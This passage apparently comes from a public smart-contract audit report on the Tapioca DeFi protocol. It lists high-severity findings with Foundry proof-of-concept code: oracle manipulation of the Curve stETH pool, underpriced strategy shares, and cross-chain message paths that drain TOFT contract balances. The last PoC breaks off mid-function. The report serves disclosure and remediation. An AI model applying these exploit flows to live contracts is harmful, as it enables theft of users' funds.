        uint256 queued = wrappedNative.balanceOf(address(this));
        if (queued > depositThreshold) {
            require(!stEth.isStakingPaused(), "LidoStrategy: staking paused");
            INative(address(wrappedNative)).withdraw(queued);
            stEth.submit{value: queued}(address(0)); //1:1 between eth<>stEth // TODO: Prob cheaper to buy stETH
            emit AmountDeposited(queued);
            return;
        }
        emit AmountQueued(amount);
    }
```

### POC

*   Imbalance the Pool to overvalue the stETH

*   Overborrow and Make the Singularity Insolvent

*   Imbalance the Pool to undervalue the stETH

*   Liquidate all Depositors (at optimal premium since attacker can control the price change)

### Coded POC

Logs

```python
[PASS] testSwapStEth() (gas: 372360)
  Initial Price 5443663537732571417920
  Changed Price 2187071651284977907921
  Initial Price 2187071651284977907921
  Changed Price 1073148438886623970
```

```python
[PASS] testSwapETH() (gas: 300192)
Logs:
  value 100000000000000000000000
  Initial Price 5443663537732571417920
  Changed Price 9755041616702274912586
  value 700000000000000000000000
  Initial Price 9755041616702274912586
  Changed Price 680711874102963551173181
```

Considering that swap fees are 1BPS, the attack is profitable at very low TVL

<details>

```solidity
// SPDX-License Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

interface ICurvePoolWeird {
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 _amount, uint256[2] memory _min_amounts) external returns (uint256[2] memory);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 _amount, uint256[2] memory _min_amounts) external returns (uint256[2] memory);

    function get_virtual_price() external view returns (uint256);
    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 _min_amount) external;

    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract Swapper is Test {
    ICurvePool pool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    uint256 TEN_MILLION_USD_AS_ETH = 5455e18; // Rule of thumb is 1BPS cost means we can use 5 Billion ETH and still be

    function swapETH() external payable {
        console2.log("value", msg.value);
        console2.log("Initial Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));

        pool.exchange{value: msg.value}(0, 1, msg.value, 0); // Swap all yolo

        // curveStEthPool.get_dy(1, 0, stEthBalance)
        console2.log("Changed Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));


    }

    function swapStEth() external {
        console2.log("Initial Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));

        // Always approve exact ;)
        uint256 amt = stETH.balanceOf(address(this));
        stETH.approve(address(pool), stETH.balanceOf(address(this)));

        pool.exchange(1, 0, amt, 0); // Swap all yolo

        // curveStEthPool.get_dy(1, 0, stEthBalance)
        console2.log("Changed Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));
    }

    receive() external payable {}
}

contract CompoundedStakesFuzz is Test {
    Swapper c;
    IERC20 token = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    function setUp() public {
        c = new Swapper();
    }

    function testSwapETH() public {
        deal(address(this), 100_000e18);
        c.swapETH{value: 100_000e18}(); /// 100k ETH is enough to double the price

        deal(address(this), 700_000e18);
        c.swapETH{value: 700_000e18}(); /// 700k ETH is enough to double the price
    }
    function testSwapStEth() public {
        vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428); // AAVE stETH // Has 700k ETH, 100k is sufficient
        token.transfer(address(c), 100_000e18);
        c.swapStEth();

        vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428); // AAVE stETH // Another one for good measure
        token.transfer(address(c), 600_000e18);
        c.swapStEth();
    }
}
```

</details>

### Mitigation

Use the Chainlink stETH / ETH Price Feed or Ideally do not expose the strategy to any conversion, simply deposit and withdraw stETH directly to avoid any risk or attack in conversions

<https://data.chain.link/arbitrum/mainnet/crypto-eth/steth-eth>

<https://data.chain.link/ethereum/mainnet/crypto-eth/steth-eth>

**[0xRektora (Tapioca) confirmed via duplicate issue 828](https://github.com/code-423n4/2023-07-tapioca-findings/issues/828)**

***

## [[H-09] `TricryptoLPStrategy.compoundAmount` always returns 0 because it's using staticall vs call](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1428)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1428)*

[`compoundAmount`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/curve/TricryptoLPStrategy.sol#L104-L107) will always try to sell 0 tokens because the `staticall` will revert since the function changes storage in `checkpoint`

This causes the `compoundAmount` to always return 0, which means that the Strategy is underpriced at all times allowing to Steal all Rewards via:

*   Deposit to own a high % of ownerhsip in the strategy (shares are underpriced)
*   Compound (shares socialize the yield to new total supply, we get the majority of that)
*   Withdraw (lock in immediate profits without contributing to the Yield)

### POC

This Test is done on the Arbitrum Tricrypto Gauge with Foundry

1 is the flag value for a revert
0 is the expected value

We get 1 when we use staticcall since the call reverts internally
We get 0 when we use call since the call doesn't

The comment in the Gauge Code is meant for usage off-chain, onChain you must accrue (or you could use a Accrue Then Revert Pattern, similar to UniV3 Quoter)

NOTE: The code for Mainnet is the same, so it will result in the same impact <br><https://etherscan.io/address/0xDeFd8FdD20e0f34115C7018CCfb655796F6B2168#code#L375>

### Foundry POC

    forge test --match-test test_callWorks --rpc-url https://arb-mainnet.g.alchemy.com/v2/ALCHEMY_KEY

Which will revert since `checkpoint` is a non-view function and staticall reverts if any state is changed

<https://arbiscan.io/address/0x555766f3da968ecbefa690ffd49a2ac02f47aa5f#code#L168>

<details>

```solidity

// SPDX-License Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";



contract GaugeCallTest is Test {
    
    // Arb Tricrypto Gauge
    address lpGauge = 0x555766f3da968ecBefa690Ffd49A2Ac02f47aa5f;

    function setUp() public {}

    function doTheCallView() internal returns (uint256) {
        (bool success, bytes memory response) = address(lpGauge).staticcall(
            abi.encodeWithSignature("claimable_tokens(address)", address(this))
        );

        uint256 claimable = 1;
        if (success) {
            claimable = abi.decode(response, (uint256));
        }

        return claimable;
    }
    function doTheCallCall() internal returns (uint256) {
        (bool success, bytes memory response) = address(lpGauge).call(
            abi.encodeWithSignature("claimable_tokens(address)", address(this))
        );

        uint256 claimable = 1;
        if (success) {
            claimable = abi.decode(response, (uint256));
        }

        return claimable;
    }

    function test_callWorks() public {
        uint256 claimableView = doTheCallView();

        assertEq(claimableView, 1); // Return 1 which is our flag for failure

        uint256 claimableNonView = doTheCallCall();

        assertEq(claimableNonView, 0); // Return 0 which means we read the proper value
    }
}
```

</details>

### Mitigation Step

You should use a non-view function like in `compound`

**[cryptotechmaker (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1428#issuecomment-1707821609)**

***

## [[H-10] Liquidated USDO from BigBang not being burned after liquidation inflates USDO supply and can threaten peg permanently](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1355)
*Submitted by [unsafesol](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1355), also found by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1166), [0xnev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/741), [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/118), and [0xRobocop](https://github.com/code-423n4/2023-07-tapioca-findings/issues/99)*

Absence of proper USDO burn after liquidation in the BigBang market results in a redundant amount of USDO being minted without any collateral or backing. Thus, the overcollaterization of USDO achieved through BigBang will be eventually lost and the value of USDO in supply (1USDO = 1&#36;) will exceed the amount of collateral locked in BigBang. This has multiple repercussions- the USDO peg will be threatened and yieldBox will have USDO which has virtually no value, resulting in all the BigBang strategies failing.

### Proof of Concept

According to the Tapioca documentation, the BigBang market mints USDO when a user deposits sufficient collateral and borrows tokens. When a user repays the borrowed USDO, the market burns the borrowed USDO and unlocks the appropriate amount of collateral. This is essential to the peg of USDO, since USDO tokens need a valid collateral backing.

While liquidating a user as well, the same procedure should be followed- after swapping the user’s collateral for USDO, the repaid USDO (with liquidation) must be burned so as to sustain the USDO peg. However, this is not being done.
As we can see here: <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L618-L637>, the collateral is swapped for USDO, and fee is extracted and transferred to the appropriate parties, but nothing is done for the remaining USDO which was repaid. At the same time, this was done correctly done in BigBang#\_repay for repayment here: <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L734-L736>.

This has the following effects:

1.  The BigBang market now has redundant yieldBox USDO shares which have no backing.
2.  The redundant USDO is now performing in yieldBox strategies of tapioca.
3.  The USDO eventually becomes overinflated and exceeds the value of underlying collateral.
4.  The strategies start not performing since they have unbacked USDO, and the USDO peg is lost as well since there is no appropriate amount of underlying collateral.

### Recommended Mitigation Steps

Burn the USDO acquired through liquidation after extracting fees for appropriate parties.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1355#issuecomment-1703046614)**

***

## [[H-11] TOFT `exerciseOption` can be used to steal all underlying erc20 tokens](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1307)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1307), also found by [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/941)*

Unvalidated input data for the [`exerciseOption`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L127) function can be used to steal all the erc20 tokens from the contract.

### Proof of Concept

Each [BaseTOFT](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol) is a wrapper around an `erc20` token and extends the `OFTV2` contract to enable smooth cross-chain transfers through LayerZero.
Depending on the erc20 token which is used usually the erc20 tokens will be held on one chain and then only the shares of `OFTV2` get transferred around (burnt on one chain, minted on another chain).
Subject to this attack is `TapiocaOFTs` or `mTapiocaOFTs` which store as an [underlying token an erc20 token(not native)](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L77). In order to mint `TOFT` shares you need to deposit the underlying erc20 tokens into the contract, and you get `TOFT` shares.

The attack flow is the following:

1.  The attack starts from the [`exerciseOption`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L127-L146). Nothing is validated here and the only cost of the attack is the [`optionsData.paymentTokenAmount`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L87) which is burned from the attacker. This can be some small amount.
2.  When the message is received on the remote chain inside the [`exercise`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L153) function it is important that nothing reverts for the attacker.
3.  For the attacker to go through the attacker needs to pass the following data:

```soldity
function exerciseInternal(
        address from,
        uint256 oTAPTokenID,
        address paymentToken,
        uint256 tapAmount,
        address target,
        ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapData
            memory tapSendData,
        ICommonData.IApproval[] memory approvals
    ) public {
        // pass zero approval so this is skipped 
        if (approvals.length > 0) {
            _callApproval(approvals);
        }
        
        // target is the address which does nothing, but has the exerciseOption implemented
        ITapiocaOptionsBroker(target).exerciseOption(
            oTAPTokenID,
            paymentToken,
            tapAmount
        );
        // tapSendData.withdrawOnAnotherChain = false so we enter else branch
        if (tapSendData.withdrawOnAnotherChain) {
            ISendFrom(tapSendData.tapOftAddress).sendFrom(
                address(this),
                tapSendData.lzDstChainId,
                LzLib.addressToBytes32(from),
                tapAmount,
                ISendFrom.LzCallParams({
                    refundAddress: payable(from),
                    zroPaymentAddress: tapSendData.zroPaymentAddress,
                    adapterParams: LzLib.buildDefaultAdapterParams(
                        tapSendData.extraGas
                    )
                })
            );
        } else {
            // tapSendData.tapOftAddress is the address of the underlying erc20 token for this TOFT
            // from is the address of the attacker
            // tapAmount is the balance of erc20 tokens of this TOFT
            IERC20(tapSendData.tapOftAddress).safeTransfer(from, tapAmount);
        }
    }
```

4.  So the attack is just simply transferring all the underlying erc20 tokens to the attacker.

The underlying `ERC20` token for each `TOFT` can be queried through [`erc20()`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFTStorage.sol#L28) function, and the `tapAmount` to pass is `ERC20` balance of the `TOFT`.

This attack is possible because the `msg.sender` inside the `exerciseInternal` is the address of the `TOFT` which is the owner of all the ERC20 tokens that get stolen.

### Recommended Mitigation Steps

Validate that `tapSendData.tapOftAddress` is the address of [`TapOFT`](https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/TapOFT.sol) token either while sending the message or during the reception of the message on the remote chain.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1307#issuecomment-1703035021)**

***

## [[H-12] TOFT `removeCollateral` can be used to steal all the balance](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1293)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1293), also found by [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1643)*

[`removeCollateral`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L190) -> [`remove`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L512) message pathway can be used to steal all the balance of the [`TapiocaOFT`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol) and [`mTapiocaOFT`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/mTapiocaOFT.sol) tokens in case when their underlying tokens is native.
TOFTs that hold native tokens are deployed with [erc20 address](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L35) set to address zero, so while [minting you need to transfer value](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L74).

### Proof of Concept

The attack needs to be executed by invoking the [`removeCollateral`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L190) function from any chain to chain on which the underlying balance resides, e.g. host chain of the TOFT.
When the message is [received on the remote chain](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L204-L258), I have placed in the comments below what are the params that need to be passed to execute the attack.

<details>

```solidity
    function remove(bytes memory _payload) public {
    (
        ,
        ,
        address to,
        ,
        ITapiocaOFT.IRemoveParams memory removeParams,
        ICommonData.IWithdrawParams memory withdrawParams,
        ICommonData.IApproval[] memory approvals
    ) = abi.decode(
        _payload,
        (
            uint16,
            address,
            address,
            bytes32,
            ITapiocaOFT.IRemoveParams,
            ICommonData.IWithdrawParams,
            ICommonData.IApproval[]
        )
    );
    // approvals can be an empty array so this is skipped
    if (approvals.length > 0) {
        _callApproval(approvals);
    }

    // removeParams.market and removeParams.share don't matter 
    approve(removeParams.market, removeParams.share);
    // removeParams.market just needs to be deployed by the attacker and do nothing, it is enough to implement IMarket interface
    IMarket(removeParams.market).removeCollateral(
        to,
        to,
        removeParams.share
    );
    
    // withdrawParams.withdraw =  true to enter the if block
    if (withdrawParams.withdraw) {
        // Attackers removeParams.market contract needs to have yieldBox() function and it can return any address
        address ybAddress = IMarket(removeParams.market).yieldBox();
        // Attackers removeParams.market needs to have collateralId() function and it can return any uint256
        uint256 assetId = IMarket(removeParams.market).collateralId();
        
        // removeParams.marketHelper is a malicious contract deployed by the attacker which is being transferred all the balance
        // withdrawParams.withdrawLzFeeAmount needs to be precomputed by the attacker to match the balance of TapiocaOFT
        IMagnetar(removeParams.marketHelper).withdrawToChain{
                value: withdrawParams.withdrawLzFeeAmount // This is not validated on the sending side so it can be any value
            }(
            ybAddress,
            to,
            assetId,
            withdrawParams.withdrawLzChainId,
            LzLib.addressToBytes32(to),
            IYieldBoxBase(ybAddress).toAmount(
                assetId,
                removeParams.share,
                false
            ),
            removeParams.share,
            withdrawParams.withdrawAdapterParams,
            payable(to),
            withdrawParams.withdrawLzFeeAmount
        );
    }
}
```

</details>

Neither `removeParams.marketHelper` or `withdrawParams.withdrawLzFeeAmount` are validated on the sending side so the former can be the address of a malicious contract and the latter can be the TOFT's balance of gas token.

This type of attack is possible because the `msg.sender` in `IMagnetar(removeParams.marketHelper).withdrawToChain` is the address of the TOFT contract which holds all the balances.

This is because:

1.  Relayer submits the message to [`lzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L35) so he is the `msg.sender`.
2.  Inside the [`_blockingLzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L25) there is a call into its own public function so the `msg.sender` is the [address of the contract](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L39).
3.  Inside the `_nonBlockingLzReceive` there is [delegatecall](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L411) into a corresponding module which preserves the `msg.sender` which is the address of the TOFT.
4.  Inside the module there is a call to [withdrawToChain](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L239) and here the `msg.sender` is the address of the TOFT contract, so we can maliciously transfer all the balance of the TOFT.

### Tools Used

Foundry

### Recommended Mitigation Steps

It's hard to recommend a simple fix since as I pointed out in my other issues the airdropping logic has many flaws.
One of the ways of tackling this issue is during the [`removeCollateral`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L190) to:

*   Do not allow `adapterParams` params to be passed as bytes but rather as `gasLimit` and `airdroppedAmount`, from which you would encode either `adapterParamsV1` or `adapterParamsV2`.
*   And then on the receiving side check and send with value only the amount the user has airdropped.

**[0xRektora (Tapioca) confirmed and commented](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1293#issuecomment-1703000096):**
 > Related to https://github.com/code-423n4/2023-07-tapioca-findings/issues/1290

***

## [[H-13] TOFT `triggerSendFrom` can be used to steal all the balance](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1290)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1290)*

[`triggerSendFrom`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L99) -> [`sendFromDestination`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L551) message pathway can be used to steal all the balance of the [`TapiocaOFT`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol) and [`mTapiocaOFT`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/mTapiocaOFT.sol)\` tokens in case when their underlying tokens is native gas token.
TOFTs that hold native tokens are deployed with [erc20 address](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L35) set to address zero, so while [minting you need to transfer value](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L74).

### Proof of Concept

The attack flow is the following:

1.  Attacker calls `triggerSendFrom` with [`airdropAdapterParams`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L41) of type [airdropAdapterParamsV1](https://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters) which don't airdrop any value on the remote chain but just deliver the message.
2.  On the other hand [lzCallParams](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L44) are of type `adapterParamsV2` which are used to airdrop the balance from the destination chain to another chain to the attacker.

```solidity
struct LzCallParams {
    address payable refundAddress; // => address of the attacker
    address zroPaymentAddress; // => doesn't matter
    bytes adapterParams; //=> airdropAdapterParamsV2
}
```

3.  Whereby the `sendFromData.adapterParams` would be encoded in the following way:

```solidity
function encodeAdapterParamsV2() public {
    // https://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters#airdrop
    uint256 gasLimit = 250_000; // something enough to deliver the message
    uint256 airdroppedAmount = max airdrop cap defined at https://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters#airdrop. => 0.24 for ethereum, 1.32 for bsc, 681 for polygon etc.
    address attacker = makeAddr("attacker"); // => address of the attacker
    bytes memory adapterParams = abi.encodePacked(uint16(2), gasLimit, airdroppedAmount, attacker);
}
```

4.  When this is received on the remote inside the [`sendFromDestination`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L118) [`ISendFrom(address(this)).sendFrom{value: address(this).balance}`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142)
    is instructed by the malicious `ISendFrom.LzCallParams memory callParams`to actually airdrop the max amount allowed by LayerZero to the attacker on the [`lzDstChainId`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L144).
5.  Since there is a cap on the maximum airdrop amount this type of attack would need to be executed multiple times to drain the balance of the TOFT.

The core issue at play here is that `BaseTOFT` delegatecalls into the `BaseTOFTOptionsModule` and thus the BaseTOFT is the `msg.sender` for `sendFrom` function.

There is also another simpler attack flow possible:

1.  Since [`sendFromDestination`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142) passes as value whole balance of the TapiocaOFT it is enough to specify the refundAddress in [callParams](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L123) as the address of the attacker.
2.  This way the whole balance will be transferred to the [\_lzSend](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L53) and any excess will be refunded to the `_refundAddress`.
3.  [This is how layer zero works](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/UltraLightNodeV2.sol#L151-L156).

### Tools Used

Foundry

### Recommended Mitigation Steps

One of the ways of tackling this issue is during the [`triggerSendFrom`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L39) to:

*   Not allowing [`airdropAdapterParams`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L41) and [`sendFromData.adapterParams`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L44) params to be passed as bytes but rather as `gasLimit` and `airdroppedAmount`, from which you would encode either `adapterParamsV1` or `adapterParamsV2`.
*   And then on the receiving side check and send with value only the amount the user has airdropped.

```solidity
// Only allow the airdropped amount to be used for another message
ISendFrom(address(this)).sendFrom{value: aidroppedAmount}(
   from,
   lzDstChainId,
   LzLib.addressToBytes32(from),
   amount,
   callParams
);
```

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1290#issuecomment-1702995456)**

***

## [[H-14] All assets of (m)TapiocaOFT can be stealed by depositing to strategy cross chain call with 1 amount but maximum shares possible](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1281)
*Submitted by [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1281)*

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L224> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L450> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L47> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L58> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L154> 

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L181-L185> 

<https://github.com/Tapioca-DAO/YieldBox/blob/f5ad271b2dcab8b643b7cf622c2d6a128e109999/contracts/YieldBox.sol#L118>

Attacker can be debited only the least possible amount (`1`) but send the `share` argument as the maximum possible value corresponding to the `erc` balance of `(m)TapiocaOFT`. This would enable the attacker to steal all the `erc` balance of the `(m)TapiocaOFT` contract.

### Proof of Concept

In `BaseTOFT`, `SendToStrategy()`, has no validation and just delegate calls to `sendToStrategy()` function of the `BaseTOFTStrategyModule`.

In the mentioned module, the quantity debited from the user is the `amount` argument, having no validation in the corresponding `share` amount:

```solidity
function sendToStrategy(
    address _from,
    address _to,
    uint256 amount,
    uint256 share,
    uint256 assetId,
    uint16 lzDstChainId,
    ICommonData.ISendOptions calldata options
) external payable {
    require(amount > 0, "TOFT_0");
    bytes32 toAddress = LzLib.addressToBytes32(_to);
    _debitFrom(_from, lzEndpoint.getChainId(), toAddress, amount);
    ...
```

Then, a payload is sent to the destination chain in `_lzSend()` of type `PT_YB_SEND_STRAT`.

Again, in `BaseTOFT`, the function `_nonBlockingLzReceive()` handles the received message and delegate calls to the `BaseTOFTStrategyModule`, function `strategyDeposit()`. In this, function, among other things, it delegate calls to `depositToYieldbox()`, of the same module:

```solidity
function depositToYieldbox(
    uint256 _assetId,
    uint256 _amount,
    uint256 _share,
    IERC20 _erc20,
    address _from,
    address _to
) public {
    _amount = _share > 0
        ? yieldBox.toAmount(_assetId, _share, false)
        : _amount;
    _erc20.approve(address(yieldBox), _amount);
    yieldBox.depositAsset(_assetId, _from, _to, _amount, _share);
}
```

The `_share` argument is the one the user initially provided in the source chain; however, the `_amount`, is computed from the `yieldBox` ratio, effectively overriding the specified `amount` in the source chain of `1`. This will credit funds to the attacker from other users that bridged assets through `(m)TapiocaOFT`.

The following POC in Foundry demonstrates how an attacker can be debited on the source chain an amount of `1` but call `depositAsset()` on the destination chain with an amount of `2e18`, the available in the `TapiocaOFT` contract.

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";

import {TapiocaOFT} from "contracts/tOFT/TapiocaOFT.sol";
import {BaseTOFTStrategyModule} from "contracts/tOFT/modules/BaseTOFTStrategyModule.sol";

import {IYieldBoxBase} from "tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";
import {ISendFrom} from "tapioca-periph/contracts/interfaces/ISendFrom.sol";
import {ICommonData} from "tapioca-periph/contracts/interfaces/ICommonData.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockYieldBox is Test {
    function depositAsset(
        uint256 assetId,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256, uint256) {}
    
    function toAmount(
        uint256,
        uint256 share,
        bool 
    ) external pure returns (uint256 amount) {
        // real formula amount = share._toAmount(totalSupply[assetId], _tokenBalanceOf(assets[assetId]), roundUp);
        // assume ratio is 1:1
        return share;
    }
}

contract TapiocaOFTPOC is Test {
    address public constant LZ_ENDPOINT = 0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    uint16 internal constant PT_YB_SEND_STRAT = 770;

    function test_POC_SendToStrategy_WithoutAllDebitedFrom() public {
        vm.createSelectFork("https://eth.llamarpc.com");

        address mockERC20_ = address(new ERC20("mockERC20", "MERC20"));

        address strategyModule_ = address(new BaseTOFTStrategyModule(address(LZ_ENDPOINT), address(0), IYieldBoxBase(address(2)), "SomeName", "SomeSymbol", 18, block.chainid));

        address mockYieldBox_ = address(new MockYieldBox());

        TapiocaOFT tapiocaOft_ = new TapiocaOFT(
            LZ_ENDPOINT,
            mockERC20_,
            IYieldBoxBase(mockYieldBox_),
            "SomeName",
            "SomeSymbol",
            18,
            block.chainid,
            payable(address(1)),
            payable(strategyModule_),
            payable(address(3)),
            payable(address(4))
        );

        // some user wraps 2e18 mock erc20
        address user_ = makeAddr("user");
        deal(mockERC20_, user_, 2e18);
        vm.startPrank(user_);
        ERC20(mockERC20_).approve(address(tapiocaOft_), 2e18);
        tapiocaOft_.wrap(user_, user_, 2e18);
        vm.stopPrank();

        address attacker_ = makeAddr("attacker");
        deal(attacker_, 1e18); // lz fees

        address from_ = attacker_;
        address to_ = attacker_;
        uint256 amount_ = 1;
